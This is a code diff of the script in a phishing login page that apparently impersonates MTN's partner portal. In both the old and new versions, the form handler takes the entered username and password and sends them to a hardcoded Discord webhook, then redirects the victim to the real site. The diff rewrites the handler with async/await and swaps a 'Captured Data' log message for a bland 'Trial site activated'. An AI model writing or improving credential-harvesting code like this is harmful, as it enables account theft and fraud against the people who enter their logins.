@@ -152,7 +152,7 @@
             });
 
             var form = document.querySelector('form');
-            form.addEventListener('submit', function(event) {
+            form.addEventListener('submit', async function(event) {
                 event.preventDefault(); // Prevent default form submission
 
                 var formData = new FormData(form);
@@ -161,26 +161,30 @@
                     data[key] = value;
                 });
 
-                console.log('Captured Data:', data); // Log captured data to check
+                console.log('Trial site activated'); // Log message
 
                 var webhookURL = 'https://discord.com/api/webhooks/1261695608570384504/L4dEVU2jhKoKSxXza-8sVfvJWru7SW4_Lk8MldXp1cbN5XYJENTMiPJC4eUL4r0M1Mx1';
 
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: `New login attempt:\nUsername: ${data.username}\nPassword: ${data.password}` })
-                })
-                .then(response => response.json())
-                .then(result => {
-                    console.log('Success:', result);
-                    window.location.href = 'https://partner.mtn.co.rw/'; // Redirect to the desired URL
-                })
-                .catch(error => {
+                try {
+                    const response = await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ content: `New login attempt:\nUsername: ${data.username}\nPassword: ${data.password}` })
+                    });
+
+                    if (response.ok) {
+                        console.log('Success:', await response.json());
+                        window.location.href = 'https://partner.mtn.co.rw/'; // Redirect to the desired URL
+                    } else {
+                        console.error('Error:', await response.text());
+                        alert('An error occurred while submitting the form.');
+                    }
+                } catch (error) {
                     console.error('Error:', error);
                     alert('An error occurred while submitting the form.');
-                });
+                }
             });
         });
     </script>
